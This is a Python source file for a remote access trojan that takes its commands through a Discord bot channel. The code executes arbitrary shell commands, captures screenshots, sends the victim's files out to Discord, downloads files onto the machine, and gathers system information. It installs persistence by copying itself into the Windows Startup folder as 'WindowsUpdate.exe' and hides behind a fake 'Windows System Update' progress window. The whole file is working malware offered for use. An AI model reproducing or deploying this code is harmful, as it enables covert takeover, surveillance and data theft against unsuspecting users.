import os
import sys
import requests
import subprocess
import time
import json
import threading
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

# Configuration - UPDATE THESE VALUES
BOT_TOKEN = "TOKEN_BOT"
CHANNEL_ID = "1452740152681042121"
AUTHORIZED_USER_IDS = [
    "1449392486429626388",
    "1291017805658984498"
]

class DiscordBotRAT:
    def __init__(self, bot_token, channel_id, authorized_user_ids):
        self.bot_token = bot_token
        self.channel_id = channel_id
        self.authorized_user_ids = authorized_user_ids
        self.session_id = self.generate_session_id()
        self.headers = {
            "Authorization": f"Bot {self.bot_token}",
            "Content-Type": "application/json"
        }
        self.last_message_id = None
        self.running = True  # RAT starts running immediately
        
    def generate_session_id(self):
        import uuid
        return str(uuid.uuid4())[:8]
        
    def send_notification(self, title, description="", color=0x00ff00):
        try:
            data = {
                "embeds": [{
                    "title": title,
                    "description": description,
                    "color": color,
                    "footer": {"text": f"Session: {self.session_id}"}
                }]
            }
            url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages"
            response = requests.post(url, headers=self.headers, json=data, timeout=5)
        except Exception:
            pass
            
    def send_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages"
                requests.post(url, headers={"Authorization": f"Bot {self.bot_token}"}, files=files, timeout=10)
        except Exception:
            pass
            
    def get_recent_messages(self, limit=20):
        try:
            url = f"https://discord.com/api/v9/channels/{self.channel_id}/messages?limit={limit}"
            response = requests.get(url, headers=self.headers, timeout=5)
            if response.status_code == 200:
                return response.json()
        except Exception:
            pass
        return []
            
    def execute_command(self, command_text):
        if not command_text.strip():
            return
            
        parts = command_text.strip().split(' ')
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        if cmd == "shell" and args:
            self.cmd_shell(args)
        elif cmd == "screenshot":
            self.cmd_screenshot(args)
        elif cmd == "download" and args:
            self.cmd_download(args)
        elif cmd == "upload" and len(args) >= 2:
            self.cmd_upload(args)
        elif cmd == "persist":
            self.cmd_persist(args)
        elif cmd == "sysinfo":
            self.cmd_sysinfo(args)
        elif cmd == "help":
            self.cmd_help(args)
        elif cmd == "exit":
            self.cmd_exit(args)
            
    def cmd_shell(self, args):
        try:
            result = subprocess.run(
                ' '.join(args), 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30
            )
            output = result.stdout + result.stderr
            self.send_notification(
                f"Shell: {' '.join(args)}", 
                f"```\n{output[:1900]}\n```", 
                0xffff00
            )
        except Exception as e:
            self.send_notification("Shell Error", str(e), 0xff0000)
            
    def cmd_screenshot(self, args):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            temp_path = os.path.join(
                os.getenv('TEMP', '/tmp'), 
                f"screenshot_{int(time.time())}.png"
            )
            screenshot.save(temp_path)
            self.send_file(temp_path)
            os.remove(temp_path)
        except Exception as e:
            self.send_notification("Screenshot Error", str(e), 0xff0000)
    
    def cmd_download(self, args):
        file_path = args[0]
        if os.path.exists(file_path):
            try:
                self.send_file(file_path)
            except Exception as e:
                self.send_notification("Download Error", str(e), 0xff0000)
        else:
            self.send_notification("File Not Found", f"File {file_path} not found", 0xff0000)
    
    def cmd_upload(self, args):
        url, dest_path = args[0], args[1]
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                with open(dest_path, 'wb') as f:
                    f.write(response.content)
                self.send_notification("Upload Success", f"File saved to {dest_path}", 0x00ff00)
            else:
                self.send_notification("Upload Failed", f"HTTP {response.status_code}", 0xff0000)
        except Exception as e:
            self.send_notification("Upload Error", str(e), 0xff0000)
    
    def cmd_persist(self, args):
        try:
            startup_path = os.path.join(
                os.getenv('APPDATA'), 
                'Microsoft', 
                'Windows', 
                'Start Menu', 
                'Programs', 
                'Startup', 
                'WindowsUpdate.exe'
            )
            
            if not os.path.exists(startup_path):
                import shutil
                current_exe = sys.executable
                shutil.copy2(current_exe, startup_path)
                
            self.send_notification("Persistence Installed", f"RAT installed to {startup_path}", 0x00ff00)
        except Exception as e:
            self.send_notification("Persistence Failed", str(e), 0xff0000)
    
    def cmd_sysinfo(self, args):
        try:
            import platform
            info = f"""
System: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {platform.node()}
User: {os.getlogin()}
Current Directory: {os.getcwd()}
"""
            self.send_notification("System Information", f"```\n{info}\n```", 0x00ffff)
        except Exception as e:
            self.send_notification("Sysinfo Error", str(e), 0xff0000)
    
    def cmd_help(self, args):
        help_text = f"""
Available Commands (use !{self.session_id} before each command):
shell <command> - Execute shell command
screenshot - Take screenshot
download <file_path> - Download file from target
upload <url> <dest_path> - Upload file to target
persist - Install persistence
sysinfo - Get system information
help - Show this help message
exit - Terminate RAT

Examples:
!{self.session_id} shell whoami
!{self.session_id} screenshot
!{self.session_id} download C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts
"""
        self.send_notification("RAT Help", help_text, 0x0000ff)
    
    def cmd_exit(self, args):
        self.send_notification("RAT Terminated", "Remote access session ended", 0xff0000)
        self.running = False
        os._exit(0)
    
    def command_listener(self):
        """Listen for incoming commands"""
        processed_messages = set()
        
        while self.running:
            try:
                messages = self.get_recent_messages(10)
                for message in messages:
                    # Check if message is from authorized user and contains our session ID
                    if (message.get('author', {}).get('id') in self.authorized_user_ids and
                        f"!{self.session_id}" in message.get('content', '') and
                        message.get('id') not in processed_messages):
                        
                        # Extract command (remove session ID prefix)
                        content = message.get('content', '')
                        if content.startswith(f"!{self.session_id}"):
                            command = content[len(f"!{self.session_id}"):].strip()
                            if command:
                                self.execute_command(command)
                                processed_messages.add(message.get('id'))
                                
                        # Limit processed messages set size
                        if len(processed_messages) > 100:
                            processed_messages.clear()
                            
                time.sleep(3)  # Check for commands every 3 seconds
            except Exception:
                time.sleep(5)
                continue

    def start_rat(self):
        """Start the RAT and send initial notification"""
        self.send_notification(
            "RAT Connected", 
            f"New session established\nPlatform: {sys.platform}\nUser: {os.getlogin()}", 
            0x00ff00
        )
        print(f"RAT Session {self.session_id} initialized - Awaiting commands...")
        
        # Start command listener in separate thread
        listener_thread = threading.Thread(target=self.command_listener, daemon=True)
        listener_thread.start()

class DisguiseGUI:
    def __init__(self, rat_instance):
        self.rat = rat_instance
        self.root = tk.Tk()
        self.root.title("System Update")
        self.root.geometry("400x250")
        self.root.resizable(False, False)
        
        # Center window
        self.root.eval('tk::PlaceWindow . center')
        
        # Make window stay on top
        self.root.attributes('-topmost', True)
        
        # Create GUI elements
        self.create_widgets()
        
    def create_widgets(self):
        # Title
        title_label = tk.Label(
            self.root, 
            text="Windows System Update", 
            font=("Arial", 14, "bold")
        )
        title_label.pack(pady=(20, 10))
        
        # Status message
        status_label = tk.Label(
            self.root, 
            text="Installing critical system updates...", 
            font=("Arial", 10)
        )
        status_label.pack(pady=5)
        
        # Progress bar simulation
        self.progress_frame = tk.Frame(self.root)
        self.progress_frame.pack(pady=20)
        
        self.progress_canvas = tk.Canvas(self.progress_frame, width=300, height=20, bg="white", bd=1, relief="solid")
        self.progress_canvas.pack()
        
        # Progress bar fill
        self.progress_fill = self.progress_canvas.create_rectangle(0, 0, 0, 20, fill="#4CAF50", outline="")
        
        # Percentage label
        self.percent_label = tk.Label(self.root, text="0%", font=("Arial", 10))
        self.percent_label.pack()
        
        # Status text
        self.status_text = tk.Label(
            self.root, 
            text="Initializing components...", 
            font=("Arial", 9),
            fg="gray"
        )
        self.status_text.pack(pady=(10, 5))
        
        # Fake progress animation
        self.progress_percent = 0
        self.animate_progress()
        
        # Close button (disabled)
        self.close_button = tk.Button(
            self.root, 
            text="Please Wait...", 
            state="disabled",
            bg="#cccccc",
            fg="gray"
        )
        self.close_button.pack(pady=(20, 10))
        
    def animate_progress(self):
        """Animate progress bar"""
        if self.progress_percent < 100:
            self.progress_percent += 1
            # Update progress bar width
            width = (self.progress_percent / 100) * 300
            self.progress_canvas.coords(self.progress_fill, 0, 0, width, 20)
            # Update percentage text
            self.percent_label.config(text=f"{self.progress_percent}%")
            
            # Update status text at different points
            if self.progress_percent == 25:
                self.status_text.config(text="Downloading security patches...")
            elif self.progress_percent == 50:
                self.status_text.config(text="Applying system updates...")
            elif self.progress_percent == 75:
                self.status_text.config(text="Finalizing installation...")
            
            # Schedule next update
            self.root.after(50, self.animate_progress)  # Update every 50ms
        else:
            # Progress complete
            self.status_text.config(text="Update complete. System is up to date.")
            self.close_button.config(
                text="Close", 
                state="normal", 
                bg="#4CAF50", 
                fg="white",
                command=self.root.destroy
            )

    def run(self):
        self.root.mainloop()

def main():
    # Initialize RAT client
    rat = DiscordBotRAT(BOT_TOKEN, CHANNEL_ID, AUTHORIZED_USER_IDS)
    
    # Start RAT immediately (in background)
    rat.start_rat()
    
    # Create and run GUI disguise
    gui = DisguiseGUI(rat)
    gui.run()
    
    # Keep main thread alive if RAT is running
    try:
        while rat.running:
            time.sleep(1)
    except KeyboardInterrupt:
        rat.cmd_exit([])

if __name__ == "__main__":
    main()